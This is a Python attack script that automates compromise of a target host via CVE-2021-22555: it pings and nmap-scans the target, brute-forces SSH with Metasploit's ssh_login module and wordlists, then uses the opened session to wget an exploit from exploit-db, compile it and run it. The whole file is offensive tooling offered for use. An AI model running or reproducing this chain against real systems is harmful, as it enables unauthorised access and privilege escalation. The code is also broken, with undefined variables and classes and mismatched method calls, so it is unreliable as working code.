#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''This script has a function to automate the attack on CVE-2021-22555. There are several steps in the attack.
1. Ping to check connection to the tartget
2. Check the target is live or not
3. Perform full open scan to the target
4. Exploiting the target through SSH
5. Sending the exploit to the target through opened exploit session
7. compiling and executing the exploit


@Filename : cve202122555.py
@Time : 2023/05/01 18:07
'''


############################################################################
# Import modules
############################################################################


import os
import sys
import time
import argparse
import nmap
from ping3 import ping, verbose_ping
from pymetasploit3.msfrpc import MsfRpcClient


############################################################################

__author__ = 'masjohncook'
__copyright__ = '(C)Copyright 2023'
__credits__ = []
__license__ = 'None'
__version__ = '0.0.1'
__maintainer__ = 'masjohncook'
__email__ = 'mas.john.cook@gmail.com'
__status__ = 'None'

############################################################################




class ExploitCVE(object):
    def __init__(self, target_ip, target_port):
        """Return the object with the data of target_ip and target_port

        Args:
            target_ip (String): the IP Address of the target
            target_port (String): the designated port of the target
        """
        self.ip = target_ip
        self.port = target_port
    
    # perform ping to the target to check simulate the host ping
    def pingTarget(self):
        """Perform ping to the target_ip
        """
        print(verbose_ping(self.ip, count=20))
            
    # check the host status through nmap
    def checkStatus(self):
        """_summary_
        """
        nm = nmap.PortScanner()
        status = nm.scan(hosts=self.ip, arguments='-n -sP -PE -PA21,23,80,3389')
        host_status = nm[self.ip]['status']['state']
        print("Target {} is {}".format(self.ip, host_status))
        
    # perform full open scan using Nmap
    def scanningTarget(self):
        """_summary_
        """
        nm = nmap.PortScanner()
        result = nm.scan(hosts=self.ip, arguments='-O -A -p 0-65535')
        
    # exploiting the target using ssh_login auxiliary module
    def openShellSession(self):
        """_summary_
        """
        client = MsfRpcClient('1234')
        user_file = os.path.abspath('resources/user.lst')
        pass_file = os.path.abspath('resources/password.lst')

        try:
            auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
            auxiliary['PASS_FILE'] = pass_file
            auxiliary['USER_FILE'] = user_file
            auxiliary['RHOSTS'] = target_ip
            auxiliary['RPORT'] = 22

            execute = auxiliary.execute()
            print(execute)
            
            # let the exploit work and finish to open the session
            time.sleep(600)

        except Exception as e:
            print(e)
    
    # send the command trouch the open session to download the exploit       
    def sendCommand(self):
        """
        """            
        shell = client.sessions.session(list(client.sessions.list.keys())[0])

        # Write to the shell
        shell.write('wget https://www.exploit-db.com/download/50135 -O exploit.c')
        # Print the output

        print(shell.read())
    
    def exploitTarget(self):
        """_summary_
        """
        shell = client.sessions.session(list(client.sessions.list.keys())[0])
        
        #compiling the exploit
        shell.write('gcc exploit.c -o exploit')
        
        shell.write('./exploit')
        
        print(shell.read())





def main(argv):
    # parsing the argv for arguments handling
    parser = argparse.ArgumentParser(
    prog='os.patj.basename(__file__)',
    description='',
    epilog='Have a nice day'
    )

    parser.add_argument('target_ip', default=1, help='IP address of the target machine')
    
    argv = parser.parse_args()
    
    ip = argv[1]
    if len(argv) == 2:
        port = None
    else:
        port = argv[2]
    
    
    try:
        scan = Scanner(ip, port)
        gain = GainingAccess(ip, port)
        scan.ping_target()
        scan.check_status()
        scan.scanning_target()
        gain.openShellSession()
        gain.sendCommand()
        gain.exploitTarget()
        p
    except Exception as e:
        print(e)
        pass

main(sys.argv)